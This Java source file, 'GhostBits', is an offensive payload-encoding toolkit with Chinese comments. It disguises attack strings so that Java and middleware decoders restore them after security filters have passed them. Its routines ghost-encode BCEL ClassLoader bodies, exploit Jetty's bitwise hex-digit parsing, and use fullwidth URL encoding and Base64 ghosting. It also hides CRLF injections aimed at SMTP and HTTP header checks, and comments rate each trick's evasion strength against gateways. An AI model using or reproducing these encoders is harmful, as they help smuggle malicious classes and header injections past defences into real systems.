package util;

import java.util.*;
import java.util.concurrent.ThreadLocalRandom;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class GhostBits {
    static Map<Integer, List<String>> hexChars = new TreeMap<>();

    static {
        for (int i = 0; i <= 15; i++) {
            hexChars.put(i, new ArrayList<>());
        }

        // 定义所有可能的十六进制字符范围
        // ===== 数字部分 =====
        int[][] digitRanges = {
                {0x0030, 0x0039},  // ASCII: 0-9
                {0x0660, 0x0669},  // 阿拉伯文
                {0x06F0, 0x06F9},  // 扩展阿拉伯文-印度数字
                {0x0966, 0x096F},  // 天城文(梵文)
                {0x09E6, 0x09EF},  // 孟加拉文
                {0x0A66, 0x0A6F},  // 古木基文
                {0x0AE6, 0x0AEF},  // 古吉拉特文
                {0x0B66, 0x0B6F},  // 奥里亚文
                {0x0BE6, 0x0BEF},  // 泰米尔文
                {0x0C66, 0x0C6F},  // 泰卢固文
                {0x0CE6, 0x0CEF},  // 卡纳达文
                {0x0D66, 0x0D6F},  // 马拉雅拉姆文
                {0x0E50, 0x0E59},  // 泰文
                {0x0ED0, 0x0ED9},  // 老挝文
                {0x0F20, 0x0F29},  // 藏文
                {0x1040, 0x1049},  // 缅甸文
                {0x17E0, 0x17E9},  // 高棉文
                {0x1810, 0x1819},  // 蒙古文
                {0xFF10, 0xFF19},  // 全角数字: ０-９
                {0x1D7CE, 0x1D7D7}, // 数学粗体数字
                {0x1D7D8, 0x1D7E1}, // 数学双线数字
                {0x1D7E2, 0x1D7EB}, // 数学等宽数字
                {0x1D7EC, 0x1D7F5}, // 数学sans-serif粗体
                {0x1D7F6, 0x1D7FF}, // 数学sans-serif双线
        };

        // ===== 字母部分 (A-F, a-f) =====
        int[][] letterRanges = {
                {0x0041, 0x0046},  // ASCII: A-F
                {0x0061, 0x0066},  // ASCII: a-f
                {0xFF21, 0xFF26},  // 全角: Ａ-Ｆ
                {0xFF41, 0xFF46},  // 全角: ａ-ｆ
        };

        // 处理数字范围
        for (int[] range : digitRanges) {
            for (int cp = range[0]; cp <= range[1]; cp++) {
                processCharacter(cp, hexChars);
            }
        }

        // 处理字母范围
        for (int[] range : letterRanges) {
            for (int cp = range[0]; cp <= range[1]; cp++) {
                processCharacter(cp, hexChars);
            }
        }
    }

    public static String unicodeHex(String hexCode, Map<Integer, List<String>> hexChars) {
        StringBuilder sb = new StringBuilder();
        Random rnd = ThreadLocalRandom.current();
        for (char ch : hexCode.toCharArray()) {
            int digit = Character.digit(ch, 16);
            if (digit >= 0) {
                List<String> chars = hexChars.get(digit);
                if (chars != null && chars.size() > 1) {
                    sb.append(chars.get(rnd.nextInt(chars.size() - 2) + 1)); // 取第一个示例字符
                } else {
                    sb.append(ch); // 回退到原字符
                }
            } else {
                sb.append(ch); // 非十六进制字符直接添加
            }
        }
        return sb.toString();
    }

    private static void processCharacter(int cp, Map<Integer, List<String>> hexChars) {
        // 检查是否为有效字符
        if (!isSafe(cp)) return;

        int digitResult = Character.digit(cp, 16);

        if (digitResult >= 0) {
            String charStr = new String( Character.toChars(cp));
            hexChars.get(digitResult).add(charStr);
        }
    }

    // ──────────── 安全判断 ────────────
    // 只允许「可见、可复制粘贴、不会影响文本显示」的字符
    private static boolean isSafe(int codePoint) {
        // 基本有效性
        if (!Character.isDefined(codePoint)) return false;

        // C0/C1 控制字符
        if (codePoint < 0x20 || (codePoint >= 0x7F && codePoint <= 0x9F)) return false;

        // 代理对 (不能单独出现)
        if (codePoint >= 0xD800 && codePoint <= 0xDFFF) return false;

        // 按 Unicode 字符类型过滤不可见/有害字符
        int type = Character.getType(codePoint);
        switch (type) {
            case Character.FORMAT:              // Cf: 零宽空格/Bidi控制符/BOM 等不可见字符
            case Character.LINE_SEPARATOR:      // Zl: U+2028 行分隔符
            case Character.PARAGRAPH_SEPARATOR: // Zp: U+2029 段分隔符
            case Character.CONTROL:             // Cc: 控制字符 (兜底)
            case Character.UNASSIGNED:          // Cn: 未分配码点
            case Character.PRIVATE_USE:         // Co: 私用区 (显示为方块)
            case Character.SURROGATE:           // Cs: 代理对 (兜底)
            case Character.NON_SPACING_MARK:    // Mn: 非间距组合标记 (附着前字符，显示异常)
            case Character.ENCLOSING_MARK:      // Me: 围绕式组合标记
            case Character.SPACE_SEPARATOR:     // Zs: 各种空格字符 (全角空格等，看不见)
                return false;
        }

        // 排除已知有问题的特定范围
        // U+FFF0-FFFF: 特殊字符 (含替换字符 U+FFFD、非字符 U+FFFE/FFFF)
        if (codePoint >= 0xFFF0) return false;
        // U+FDD0-FDEF: Unicode 永久非字符
        if (codePoint >= 0xFDD0 && codePoint <= 0xFDEF) return false;
        // U+FE00-FE0F: 变体选择符 (不可见，影响前字符渲染)
        if (codePoint >= 0xFE00 && codePoint <= 0xFE0F) return false;
        // U+FE20-FE2F: 组合半标记
        if (codePoint >= 0xFE20 && codePoint <= 0xFE2F) return false;

        return true;
    }

    // 预收集的安全高字节（用于逐字符随机模式，保留供其他方法使用）
    private static final int[] SAFE_HIGH_BYTES = IntStream.rangeClosed(1, 0xFF)
            .filter(h -> h < 0xD8 || h > 0xDF)
            .toArray();

    // ──────────── 性能优化: 预计算码点查找表 ────────────
    // PRECOMPUTED_SAFE_CPS[byteVal] = 该 byteVal 对应的所有安全码点数组
    // 启动时一次性计算好，运行时直接从数组随机取，避免 isSafe/Character.isDefined 调用
    private static final int[][] PRECOMPUTED_SAFE_CPS = buildPrecomputedTable();

    private static int[][] buildPrecomputedTable() {
        int[][] table = new int[256][];
        for (int byteVal = 0; byteVal < 256; byteVal++) {
            List<Integer> safeCps = new ArrayList<>();
            for (int high : SAFE_HIGH_BYTES) {
                int cp = (high << 8) | byteVal;
                if (isSafe(cp)) {
                    safeCps.add(cp);
                }
            }
            if (safeCps.isEmpty()) {
                // 回退到默认 CJK 基址
                safeCps.add(DEFAULT_BASE + byteVal);
            }
            table[byteVal] = safeCps.stream().mapToInt(Integer::intValue).toArray();
        }
        return table;
    }

    // ──────────── 多语言基底集合 ────────────
    // 每个基底 low byte = 0，且 base .. base+255 必须全部安全
    private static final int[] MULTILINGUAL_BASES = buildMultilingualBases();

    private static int[] buildMultilingualBases() {
        // 手工挑选稳固的 Unicode 区块起点（低 8 位均为 0）
        // 覆盖主要文字系统，且整页 256 码点都是有效可打印字符
        int[] manualBases = {
                // 拉丁扩展
                0x0100, 0x0200, 0x0300, 0x0400, // 拉丁扩展 A/B, IPA 扩展等
                0x1E00, 0x2C00, 0x2D00,         // 拉丁扩展补充
                // 希腊语
                0x0370, 0x1F00,                 // 希腊与科普特, 希腊扩展
                // 西里尔
                0x0400, 0x0500, 0x2C00,         // 西里尔, 补充
                // 亚美尼亚
                0x0530,
                // 希伯来
                0x0590,
                // 阿拉伯
                0x0600, 0x0750, 0x08A0,
                // 叙利亚
                0x0700,
                // 它拿字母
                0x0780,
                // 天城文
                0x0900,
                // 孟加拉
                0x0980,
                // 古木基
                0x0A00,
                // 古吉拉特
                0x0A80,
                // 奥里亚
                0x0B00,
                // 泰米尔
                0x0B80,
                // 泰卢固
                0x0C00,
                // 卡纳达
                0x0C80,
                // 马拉雅拉姆
                0x0D00,
                // 僧伽罗
                0x0D80,
                // 泰文
                0x0E00,
                // 老挝
                0x0E80,
                // 缅甸
                0x1000,
                // 高棉
                0x1780,
                // 蒙古
                0x1800, 0x18A0,
                // 拉丁扩展更多
                0xA720, 0xAB00,
                // 音标扩展
                0x1D00, 0x1E00,
                // 数学符号
                0x2100, 0x2200, 0x2300, 0x2400, 0x2500, 0x2600,
                // 箭头、几何形状
                0x2700, 0x2800, 0x2900, 0x2A00, 0x2B00,
                // 中日韩统一表意文字 (CJK Unified Ideographs) 大量页
                0x4E00, 0x4F00, 0x5000, 0x5100, 0x5200, 0x5300,
                0x5400, 0x5500, 0x5600, 0x5700, 0x5800, 0x5900,
                0x5A00, 0x5B00, 0x5C00, 0x5D00, 0x5E00, 0x5F00,
                0x6000, 0x6100, 0x6200, 0x6300, 0x6400, 0x6500,
                0x6600, 0x6700, 0x6800, 0x6900, 0x6A00, 0x6B00,
                0x6C00, 0x6D00, 0x6E00, 0x6F00, 0x7000, 0x7100,
                0x7200, 0x7300, 0x7400, 0x7500, 0x7600, 0x7700,
                0x7800, 0x7900, 0x7A00, 0x7B00, 0x7C00, 0x7D00,
                0x7E00, 0x7F00, 0x8000, 0x8100, 0x8200, 0x8300,
                0x8400, 0x8500, 0x8600, 0x8700, 0x8800, 0x8900,
                0x8A00, 0x8B00, 0x8C00, 0x8D00, 0x8E00, 0x8F00,
                0x9000, 0x9100, 0x9200, 0x9300, 0x9400, 0x9500,
                0x9600, 0x9700, 0x9800, 0x9900, 0x9A00, 0x9B00,
                0x9C00, 0x9D00, 0x9E00, 0x9F00
        };

        // 过滤：只保留该页所有 256 个码点都安全的基底
        return Arrays.stream(manualBases)
                .filter(base -> IntStream.range(0, 256).allMatch(offset -> isSafe(base + offset)))
                .toArray();
    }

    // ──────────── 动态遍历所有安全基底 ────────────
    public static List<Integer> allSafeBases() {
        return IntStream.rangeClosed(0x01, 0xFF)         // 所有高字节
                .filter(h -> h < 0xD8 || h > 0xDF)      // 跳过代理对
                .mapToObj(h -> (h << 8))                 // 构造基底，低字节 0
                .filter(base -> IntStream.range(0, 256).allMatch(offset -> isSafe(base + offset)))
                .collect(Collectors.toList());
    }

    // ──────────── 编码方法 ────────────
    // 默认汉语基址
    public static final int DEFAULT_BASE = 0x4E00;

    public static String encode(String text) {
        return encode(text, DEFAULT_BASE);
    }

    public static String encode(String text, int base) {
        StringBuilder sb = new StringBuilder();
        for (char ch : text.toCharArray()) {
            int byteVal = ch & 0xFF;
            int cp = base + byteVal;
            if (!isSafe(cp)) cp = DEFAULT_BASE + byteVal; // 回退
            sb.appendCodePoint(cp);
        }
        return sb.toString();
    }

    // 逐字符随机高字节（最大混淆）— 使用预计算查找表，O(n) 纯数组访问
    public static String encodePerCharRandom(String text) {
        int len = text.length();
        StringBuilder sb = new StringBuilder(len * 2); // 预分配容量
        Random rnd = ThreadLocalRandom.current();
        for (int i = 0; i < len; i++) {
            int byteVal = text.charAt(i) & 0xFF;
            int[] candidates = PRECOMPUTED_SAFE_CPS[byteVal];
            sb.appendCodePoint(candidates[rnd.nextInt(candidates.length)]);
        }
        return sb.toString();
    }

    /**
     * BCEL Ghost 编码：先解码为原始压缩字节，再 Ghost 编码每个字节
     *
     * 原理 (来自 PDF "Cast Attack: Ghost Bits"):
     *   1. Utility.decode() 内部用 JavaReader.read() 逐字符读取
     *   2. 如果字符 == '$' (0x24)，进入转义模式解析后续 hex/MAP_CHAR
     *   3. 否则直接返回字符值，bos.write(ch) 截断为 (byte)(ch & 0xFF)
     *
     * Ghost 编码策略:
     *   - 先用 bcelDecodeRaw() 模拟 Utility.decode(body, false) 得到原始压缩字节
     *   - 对每个字节加随机高位变成 Unicode Ghost 字符
     *   - 所有 Ghost 字符的 codepoint > 0xFF，JavaReader 不会识别为 '$'
     *   - 每个字符都走路径3: 直接返回 → bos.write() 截断 → 还原原始字节
     *   - 最后 ClassLoader 的 Utility.decode(str, true) 对还原的字节做 GZIP 解压 → 原始 class
     */
    public static String bcelGhostEncode(String text) {
        // 纯 Java 实现 BCEL 解码，不依赖 JDK 内部类
        byte[] rawBytes = bcelDecodeRaw(text);

        // 对每个字节做 Ghost 编码
        StringBuilder sb = new StringBuilder(rawBytes.length);
        Random rnd = ThreadLocalRandom.current();
        for (byte b : rawBytes) {
            int byteVal = b & 0xFF;
            int[] candidates = PRECOMPUTED_SAFE_CPS[byteVal];
            sb.appendCodePoint(candidates[rnd.nextInt(candidates.length)]);
        }
        return sb.toString();
    }

    /**
     * 纯 Java 模拟 JDK BCEL Utility.decode(str, false)
     * 从 JDK 11 字节码反编译还原的 JavaReader.read() 逻辑:
     *
     *   读取字符 b:
     *   - b != '$' → 直接返回 b
     *   - b == '$' → 读下一个字符 c2:
     *     - c2 在 '0'-'9' 或 'a'-'f' → 再读 c3，parseInt(c2+c3, 16)  (标准hex)
     *     - c2 其他字符 → MAP_CHAR[c2]  (单字符映射，值 0-47)
     *
     *   MAP_CHAR 映射 (从 static initializer 字节码还原):
     *     A=0, B=1, ..., Z=25, g=26, h=27, ..., z=45, $=46, _=47
     */
    private static final int[] BCEL_MAP_CHAR = new int[256];
    static {
        int idx = 0;
        for (int c = 'A'; c <= 'Z'; c++) BCEL_MAP_CHAR[c] = idx++;  // A-Z → 0-25
        for (int c = 'g'; c <= 'z'; c++) BCEL_MAP_CHAR[c] = idx++;  // g-z → 26-45
        BCEL_MAP_CHAR['$'] = idx++;  // $ → 46
        BCEL_MAP_CHAR['_'] = idx;    // _ → 47
    }

    private static byte[] bcelDecodeRaw(String bcelBody) {
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        int i = 0;
        int len = bcelBody.length();
        while (i < len) {
            int b = bcelBody.charAt(i++);
            if (b != '$') {
                // 非 $ → 直接写入 (byte 截断)
                bos.write(b);
                continue;
            }
            // $ 转义
            if (i >= len) break;
            int c2 = bcelBody.charAt(i++);
            // 检查 c2 是否在 '0'-'9' 或 'a'-'f' (标准hex路径)
            if ((c2 >= '0' && c2 <= '9') || (c2 >= 'a' && c2 <= 'f')) {
                // 再读一个字符组成两位hex
                if (i >= len) break;
                int c3 = bcelBody.charAt(i++);
                String hex = "" + (char) c2 + (char) c3;
                bos.write(Integer.parseInt(hex, 16));
            } else {
                // MAP_CHAR 单字符映射
                bos.write(BCEL_MAP_CHAR[c2 & 0xFF]);
            }
        }
        return bos.toByteArray();
    }

    /**
     * Jackson Ghost 编码入口（JSON 智能识别）:
     * 1. 若输入看起来像 JSON，仅对字符串字面量内容做 Ghost 高位包装，
     *    保留 JSON 结构字符（{}:,"等）
     * 2. 若非 JSON，则对整段文本编码
     */
    public static String jacksonGhostEncode(String text) {
        if (text == null || text.isEmpty()) return text;
        if (looksLikeJson(text)) {
            return encodeJsonStringsGhost(text);
        } else {
            return encodePerCharRandom(text);
        }
    }

    /**
     * 启发式判断是否像 JSON：去掉首尾空白后以 { 或 [ 开头，且含双引号
     * package-private: Json.java 也会调用此方法
     */
    static boolean looksLikeJson(String text) {
        String s = text.trim();
        if (s.isEmpty() || (s.charAt(0) != '{' && s.charAt(0) != '[')) {
            return false;
        }
        return s.indexOf('"') >= 0;
    }

    /**
     * 基于双引号边界扫描 JSON 文本，仅对 "..." 字符串字面量内容做 Ghost 编码
     * 保留 JSON 结构字符原样不动
     */
    private static String encodeJsonStringsGhost(String text) {
        StringBuilder out = new StringBuilder(text.length() * 2);
        int i = 0;
        int n = text.length();
        while (i < n) {
            char c = text.charAt(i);
            if (c != '"') {
                // 非双引号字符：原样保留（结构字符、数字、布尔等）
                out.append(c);
                i++;
                continue;
            }
            // 遇到起始双引号，扫描到匹配的结束双引号
            int j = i + 1;
            while (j < n) {
                char cj = text.charAt(j);
                if (cj == '\\' && j + 1 < n) {
                    // 转义序列：跳过两个字符
                    j += 2;
                    continue;
                }
                if (cj == '"') break;
                j++;
            }
            if (j >= n) {
                // 未闭合的双引号：原样输出剩余部分
                out.append(text, i, n);
                break;
            }
            // 提取字符串字面量内容（不含外层双引号）
            String innerRaw = text.substring(i + 1, j);
            // 对字符串内容逐字符 Ghost 编码
            String encoded = encodePerCharRandom(innerRaw);
            out.append('"').append(encoded).append('"');
            i = j + 1;
        }
        return out.toString();
    }


    // ──────────── 解码 ────────────
    public static String decode(String ghostText) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < ghostText.length(); ) {
            int cp = ghostText.codePointAt(i);
            sb.append((char) (cp & 0xFF));
            i += Character.charCount(cp);
        }
        return sb.toString();
    }

    // ──────────── 变体生成 ────────────

    /**
     * 使用多语言区块生成多个变体（随机从不同语言中选取基底）
     */
    public static List<String> generateVariantsByBlock(String text, int count) {
        Random rnd = ThreadLocalRandom.current();
        List<String> variants = new ArrayList<>(count);
        int[] bases = MULTILINGUAL_BASES;
        for (int v = 0; v < count; v++) {
            int base = bases[rnd.nextInt(bases.length)];
            variants.add(encode(text, base));
        }
        return variants;
    }

    /**
     * 遍历所有可用语言区块，每个区块生成一个变体
     */
    public static List<String> generateAllBlockVariants(String text) {
        return Arrays.stream(MULTILINGUAL_BASES)
                .mapToObj(base -> encode(text, base))
                .collect(Collectors.toList());
    }

    // 列出可用基底（带 Unicode 区块名）
    public static void listAvailableBases() {
        System.out.println("可用多语言基底 (共 " + MULTILINGUAL_BASES.length + " 个):");
        for (int base : MULTILINGUAL_BASES) {
            Character.UnicodeBlock block = Character.UnicodeBlock.of(base);
            System.out.printf("U+%04X  (%s)%n", base, block != null ? block : "N/A");
        }
    }

    // ══════════════════════════════════════════════════════════════════
    //  Jetty TypeUtil.convertHexDigit 位运算绕过
    //  原理: Jetty 用 (c & 0x1F) + ((c >> 6) << 3) - 16 代替查表
    //  某些非标准 hex 字符经过此算法仍然返回合法 hex 值 (0-15)
    //  攻击者可用这些 "ghost hex char" 替代正常的 0-9 A-F
    //  抗性: [网关安全: 绝对安全] [规范化免疫: 绝对免疫] [编码链: 绝对免疫]
    // ══════════════════════════════════════════════════════════════════

    // Jetty hex digit 映射表: hexValue(0-15) -> 可用的 ghost 字符列表
    private static final Map<Integer, List<Character>> JETTY_GHOST_MAP = buildJettyGhostMap();

    /**
     * 移植自 Jetty 的 TypeUtil.convertHexDigit 位运算算法
     * 公式: d = (c & 0x1F) + ((c >> 6) << 3) - 16
     *
     * @param c 输入字符的码点
     * @return 0-15 的 hex 值，如果不合法返回 -1
     */
    public static int jettyHexDigit(int c) {
        int d = (c & 0x1F) + ((c >> 6) << 3) - 16;
        return (d >= 0 && d <= 15) ? d : -1;
    }

    /**
     * 构建 Jetty Ghost 字符映射表
     * 扫描 0x21-0x7E 的可打印 ASCII 字符，找出那些经过 Jetty 位运算后
     * 产生合法 hex 值、但本身不是标准 hex 字符 (0-9 A-F a-f) 的字符
     */
    private static Map<Integer, List<Character>> buildJettyGhostMap() {
        // 标准 hex 字符集合
        String stdHex = "0123456789abcdefABCDEF";
        Map<Integer, List<Character>> map = new HashMap<>();
        for (int hv = 0; hv < 16; hv++) {
            map.put(hv, new ArrayList<>());
        }
        // 扫描所有可打印 ASCII（排除空格 0x20）
        for (int c = 0x21; c <= 0x7E; c++) {
            int d = jettyHexDigit(c);
            if (d >= 0 && stdHex.indexOf((char) c) < 0) {
                // c 不是标准 hex 字符，但 Jetty 算法认为它是合法 hex → ghost 字符
                map.get(d).add((char) c);
            }
        }
        return map;
    }

    /**
     * Jetty Hex 编码: 将输入文本的每个 UTF-8 字节用 Jetty ghost 字符编码为 %XX
     * 如果某个 hex 值没有可用的 ghost 字符，则回退到标准 hex 字符
     *
     * @param text 待编码文本
     * @return 形如 %XX%YY 的 Jetty Ghost 编码结果
     */
    public static String jettyHexEncode(String text) {
        byte[] raw = text.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        Random rnd = ThreadLocalRandom.current();
        StringBuilder sb = new StringBuilder(raw.length * 3);
        for (byte b : raw) {
            int unsigned = b & 0xFF;
            int hi = (unsigned >> 4) & 0xF; // 高4位
            int lo = unsigned & 0xF;         // 低4位
            // 为高4位和低4位分别选择 ghost 字符
            char c1 = pickJettyGhostChar(hi, rnd);
            char c2 = pickJettyGhostChar(lo, rnd);
            sb.append('%').append(c1).append(c2);
        }
        return sb.toString();
    }

    /**
     * 为指定 hex 值选择一个 Jetty ghost 字符
     * 如果没有可用的 ghost 字符，回退到标准大写 hex 字符
     */
    private static char pickJettyGhostChar(int hexVal, Random rnd) {
        List<Character> ghosts = JETTY_GHOST_MAP.get(hexVal);
        if (ghosts != null && !ghosts.isEmpty()) {
            return ghosts.get(rnd.nextInt(ghosts.size()));
        }
        // 回退到标准 hex 字符
        return Character.toUpperCase(Character.forDigit(hexVal, 16));
    }

    // ══════════════════════════════════════════════════════════════════
    //  全角 URL 编码
    //  原理: 将 ASCII 可打印字符映射到全角区 (c + 0xFEE0)
    //  利用 URLDecoder -> File.toURL 链路差异
    //  抗性: [网关安全: 中等] [规范化免疫: 极度危险(NFKC会还原)] [编码链: 依赖UTF-8]
    //  警告: 仅用于无 NFKC 规范化的老旧 Java 中间件链路！
    // ══════════════════════════════════════════════════════════════════

    /**
     * 全角 URL 编码: ASCII 可打印字符 (0x21-0x7E) 映射到全角区，空格映射到全角空格
     * 结果进行 URL 百分号编码
     *
     * @param text 待编码文本
     * @return URL 百分号编码后的全角字符串
     */
    public static String fullwidthUrlEncode(String text) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < text.length(); i++) {
            char ch = text.charAt(i);
            int c = ch;
            String encoded;
            if (c >= 0x21 && c <= 0x7E) {
                // ASCII 可打印字符 → 全角 (+ 0xFEE0)
                encoded = urlEncodeChar((char) (c + 0xFEE0));
            } else if (c == 0x20) {
                // 空格 → 全角空格 U+3000
                encoded = urlEncodeChar('\u3000');
            } else if (c == 0x0A || c == 0x0D) {
                // 换行符直接 URL 编码
                encoded = urlEncodeChar(ch);
            } else {
                // 其他字符直接 URL 编码
                encoded = urlEncodeChar(ch);
            }
            sb.append(encoded);
        }
        return sb.toString();
    }

    /**
     * 将单个字符进行 UTF-8 URL 百分号编码
     */
    private static String urlEncodeChar(char ch) {
        byte[] bytes = String.valueOf(ch).getBytes(java.nio.charset.StandardCharsets.UTF_8);
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%%%02X", b & 0xFF));
        }
        return sb.toString();
    }

    // ══════════════════════════════════════════════════════════════════
    //  Ghost URL 编码 (Jetty Hex + CJK 混合)
    //  原理: 交替使用 Jetty Hex 纯 ASCII 编码和 CJK 高位包装
    //  第一个字符用 Jetty Hex，第二个用 CJK 高位，交替进行
    //  抗性: 交替变动（Jetty Hex 部分绝对安全，CJK 部分依赖 UTF-8 链路）
    // ══════════════════════════════════════════════════════════════════

    /**
     * Ghost URL 编码: Jetty Hex 和 CJK 高位包装混合使用
     *
     * @param text 待编码文本
     * @return 混合编码结果
     */
    public static String ghostUrlEncode(String text) {
        Random rnd = ThreadLocalRandom.current();
        StringBuilder sb = new StringBuilder();
        int idx = 0;
        for (int i = 0; i < text.length(); i++) {
            char ch = text.charAt(i);
            int c = ch;
            if (c <= 0xFF) {
                if (idx % 2 == 0) {
                    // 偶数位: Jetty Hex 编码 (纯 ASCII 逻辑)
                    int hi = (c >> 4) & 0xF;
                    int lo = c & 0xF;
                    char c1 = pickJettyGhostChar(hi, rnd);
                    char c2 = pickJettyGhostChar(lo, rnd);
                    sb.append('%').append(c1).append(c2);
                } else {
                    // 奇数位: CJK 高位包装（使用预计算表）
                    int[] candidates = PRECOMPUTED_SAFE_CPS[c];
                    sb.appendCodePoint(candidates[rnd.nextInt(candidates.length)]);
                }
            } else {
                // 非 ASCII 字符: URL 编码
                sb.append(urlEncodeChar(ch));
            }
            idx++;
        }
        return sb.toString();
    }

    // ══════════════════════════════════════════════════════════════════
    //  Base64 Ghost Bits
    //  原理: JDK Base64 解码器内部查表时用 (byte)ch 截断
    //  将 Base64 编码结果的每个字符都加上随机高字节
    //  解码器截断高位后仍能正确查表还原
    //  抗性: [网关安全: 取决于高字节策略] [规范化免疫: CJK下免疫]
    // ══════════════════════════════════════════════════════════════════

    /**
     * Base64 Ghost 编码: 先 Base64 编码，然后每个字符加随机高字节
     *
     * @param text 待编码文本
     * @return Ghost 化的 Base64 字符串
     */
    public static String base64GhostEncode(String text) {
        // 先进行标准 Base64 编码
        String b64 = java.util.Base64.getEncoder().encodeToString(
                text.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        Random rnd = ThreadLocalRandom.current();
        StringBuilder sb = new StringBuilder(b64.length() * 2);
        for (int i = 0; i < b64.length(); i++) {
            int byteVal = b64.charAt(i) & 0xFF;
            int[] candidates = PRECOMPUTED_SAFE_CPS[byteVal];
            sb.appendCodePoint(candidates[rnd.nextInt(candidates.length)]);
        }
        return sb.toString();
    }

    // ══════════════════════════════════════════════════════════════════
    //  CRLF 注入编码
    //  原理: 用 Ghost 字符包装 CR(0x0D) 和 LF(0x0A)
    //  绕过中间件的换行符检测（angus.mail SMTP / HttpClient HTTP）
    //  用户使用 [CRLF] 标记表示换行注入点
    //  抗性: [网关: SMTP应用层不经过网关; HTTP头极严苛]
    // ══════════════════════════════════════════════════════════════════

    /**
     * CRLF 注入编码: 将 [CRLF] 标记替换为 Ghost 化的 CR+LF
     * 其他字符也进行 Ghost 高位包装
     *
     * @param text 包含 [CRLF] 标记的文本
     * @return Ghost 化的 CRLF 注入文本
     */
    public static String crlfGhostEncode(String text) {
        Random rnd = ThreadLocalRandom.current();
        // 按 [CRLF] 标记分段
        String[] segments = text.split("\\[CRLF\\]", -1);
        StringBuilder sb = new StringBuilder(text.length() * 2);
        for (int idx = 0; idx < segments.length; idx++) {
            // 对每个段的字符进行 Ghost 高位包装（使用预计算表）
            for (int i = 0; i < segments[idx].length(); i++) {
                int c = segments[idx].charAt(i) & 0xFF;
                int[] candidates = PRECOMPUTED_SAFE_CPS[c];
                sb.appendCodePoint(candidates[rnd.nextInt(candidates.length)]);
            }
            // 段之间插入 Ghost 化的 CR+LF
            if (idx < segments.length - 1) {
                int[] crCandidates = PRECOMPUTED_SAFE_CPS[0x0D];
                sb.appendCodePoint(crCandidates[rnd.nextInt(crCandidates.length)]);
                int[] lfCandidates = PRECOMPUTED_SAFE_CPS[0x0A];
                sb.appendCodePoint(lfCandidates[rnd.nextInt(lfCandidates.length)]);
            }
        }
        return sb.toString();
    }
}
